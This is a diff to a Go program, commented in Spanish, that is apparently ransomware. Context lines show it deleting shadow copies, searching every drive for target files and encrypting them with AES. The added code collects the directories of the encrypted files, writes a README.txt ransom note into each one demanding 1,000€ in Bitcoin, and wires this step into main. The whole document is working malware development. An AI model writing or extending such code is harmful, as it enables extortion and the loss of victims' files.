@@ -117,8 +117,31 @@ func deleteShadowCopies() error {
 	return nil
 }
 
+//Creador de Notas de rescate
+func notaRescate(dirs []string) error {
+	fmt.Println("=== Creando nota de rescate ===")
+	
+	if len(dirs) == 0 {
+		return fmt.Errorf("no se encontraron directorios para crear la nota de rescate")
+	}
+	
+	noteContent := `¡YOUR COMPUTER HAS BEEN INFECTADO!
+	Your archivos has been cifrados. To recupereishon your files, 
+	you tener to pay 1.000€ en Bitcoin
+	`
+	for _, dir := range dirs {
+		notePath := filepath.Join(dir, "README.txt")
+		err := os.WriteFile(notePath, []byte(noteContent), 0644)
+		if err != nil {
+			fmt.Printf("  ✗ Error al crear nota en %s: %v\n", dir, err)
+		} else {
+			fmt.Printf("  ✓ Nota de rescate creada en: %s\n", notePath)
+		}
+	}
+	return nil
+}
 // searchFiles busca archivos específicos en todo el sistema
-func searchFiles() ([]string, error) {
+func searchFiles() ([]string, []string, error) {
 	fmt.Println("=== Iniciando búsqueda de archivos ===")
 	
 	// Extensiones a buscar
@@ -126,12 +149,14 @@ func searchFiles() ([]string, error) {
 	
 	// Array para almacenar las rutas absolutas encontradas
 	var foundFiles []string
-	
+	var foundDirs []string
+
+	seenDirs := make(map[string]bool)
 	// Obtener todas las unidades del sistema (C:, D:, etc.)
 	drives := getDrives()
 	
 	if len(drives) == 0 {
-		return nil, fmt.Errorf("no se encontraron unidades de disco")
+		return nil, nil, fmt.Errorf("no se encontraron unidades de disco")
 	}
 	
 	fmt.Printf("Buscando en unidades: %v\n\n", drives)
@@ -160,6 +185,13 @@ func searchFiles() ([]string, error) {
 						if err == nil {
 							foundFiles = append(foundFiles, absPath)
 							fmt.Printf("  Encontrado: %s\n", absPath)
+							dirPath := filepath.Dir(absPath)
+                            
+                            // 3. Si la carpeta no está en nuestro mapa, la añadimos
+                            if !seenDirs[dirPath] {
+                                seenDirs[dirPath] = true                  // Marcamos como vista
+                                foundDirs = append(foundDirs, dirPath)    // La guardamos en la lista final
+                            }
 						}
 						break
 					}
@@ -175,7 +207,7 @@ func searchFiles() ([]string, error) {
 	}
 	
 	fmt.Printf("\n✓ Búsqueda completada. Total de archivos encontrados: %d\n\n", len(foundFiles))
-	return foundFiles, nil
+	return foundFiles, foundDirs, nil 
 }
 
 // encryptFiles cifra todos los archivos encontrados usando AES
@@ -352,7 +384,7 @@ func main() {
 	}
 	
 	// Paso 2: Buscar archivos específicos
-	files, err := searchFiles()
+	files, dirs, err := searchFiles()
 	if err != nil {
 		fmt.Fprintf(os.Stderr, "Error: %v\n", err)
 		os.Exit(1)
@@ -367,7 +399,12 @@ func main() {
 		os.Exit(1)
 	}
 
-	// Paso 5: Mostrar el GIF y reproducir el audio
+	// Paso 5: Dejar nota de rescate
+	if err := notaRescate(dirs); err != nil {
+		fmt.Fprintf(os.Stderr, "Error: %v\n", err)
+		os.Exit(1)
+	}
+	// Paso 6: Mostrar el GIF y reproducir el audio
 	if err := showMediaWindow(); err != nil {
 		fmt.Fprintf(os.Stderr, "Error: %v\n", err)
 		os.Exit(1)
